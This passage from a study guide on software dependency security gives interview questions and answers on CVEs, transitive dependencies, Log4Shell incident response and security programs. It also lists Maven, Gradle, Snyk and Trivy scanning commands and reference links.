| **Trivy** | Open source | Fast, container support | Newer, less mature |
| **JFrog Xray** | Commercial | Deep integration with Artifactory | Cost, complexity |

---

## 🔟 Interview Follow-Up Questions

### L4 Questions

**Q: What is a CVE and how do you use it?**
A: CVE (Common Vulnerabilities and Exposures) is a standardized identifier for security vulnerabilities. Each CVE has a unique ID (like CVE-2021-44228), description, affected versions, and severity score (CVSS). You use CVEs to track vulnerabilities in your dependencies, prioritize fixes based on severity, and verify that updates actually fix the vulnerability.

**Q: What's the difference between direct and transitive dependencies?**
A: Direct dependencies are libraries you explicitly add to your project (in pom.xml or build.gradle). Transitive dependencies are libraries that your direct dependencies depend on. You might have 10 direct dependencies but 100+ transitive ones. Both can have vulnerabilities, so you need to scan the entire dependency tree.

### L5 Questions

**Q: How would you respond to a critical vulnerability like Log4Shell?**
A:
1. **Assess**: Determine if we use the affected component (check SBOM)
2. **Scope**: Identify all affected applications
3. **Mitigate**: Apply immediate mitigations (WAF rules, config changes)
4. **Patch**: Update to fixed version, test, deploy
5. **Verify**: Confirm vulnerability is resolved
6. **Communicate**: Notify stakeholders, update incident log
7. **Improve**: Add to banned dependencies, improve detection

**Q: How do you balance security updates with stability?**
A: Tiered approach based on severity and type:
- Critical security: Immediate, accept some risk of breakage
- High security: Within 48 hours, expedited testing
- Patch versions: Auto-merge if tests pass
- Minor versions: Weekly review, standard testing
- Major versions: Planned migration with full regression testing

### L6 Questions

**Q: Design a dependency security program for a large organization.**
A:
1. **Policy**: Define SLAs by severity, approved sources, banned packages
2. **Tooling**: Centralized scanning (Snyk/Xray), SBOM generation, artifact signing
3. **Process**: Automated PRs, security review gates, exception workflow
4. **Metrics**: Mean time to remediate, vulnerability backlog, coverage
5. **Training**: Developer security training, secure coding guidelines
6. **Governance**: Security champions, regular audits, compliance reporting
7. **Incident Response**: Playbooks for critical vulnerabilities

---

## 1️⃣1️⃣ One Clean Mental Summary

Dependency security manages the risk from third-party code, which makes up 90%+ of most applications. The key practices are: know your dependencies (generate SBOM), scan continuously (not just at build time), update promptly (automate with Dependabot/Renovate), and have a response plan for critical vulnerabilities. Tools like OWASP Dependency-Check and Snyk identify known vulnerabilities by matching your dependencies against CVE databases. The goal is to minimize the window between vulnerability disclosure and your remediation. Remember Log4Shell: you might not even know you're using a vulnerable library because it's a transitive dependency.

---

## Quick Reference Commands

```bash
# Maven: Check for vulnerabilities
mvn dependency-check:check

# Maven: Show dependency tree
mvn dependency:tree

# Maven: Check for updates
mvn versions:display-dependency-updates

# Maven: Generate SBOM
mvn org.cyclonedx:cyclonedx-maven-plugin:makeAggregateBom

# Gradle: Check for vulnerabilities
./gradlew dependencyCheckAnalyze

# Snyk CLI
snyk test
snyk monitor

# Trivy
trivy fs --security-checks vuln .
```

---

## References

- [OWASP Dependency-Check](https://owasp.org/www-project-dependency-check/)
- [NVD (National Vulnerability Database)](https://nvd.nist.gov/)
- [Snyk Vulnerability Database](https://snyk.io/vuln/)
- [SLSA Framework](https://slsa.dev/)
- [CycloneDX SBOM Standard](https://cyclonedx.org/)
- [GitHub Advisory Database](https://github.com/advisories)

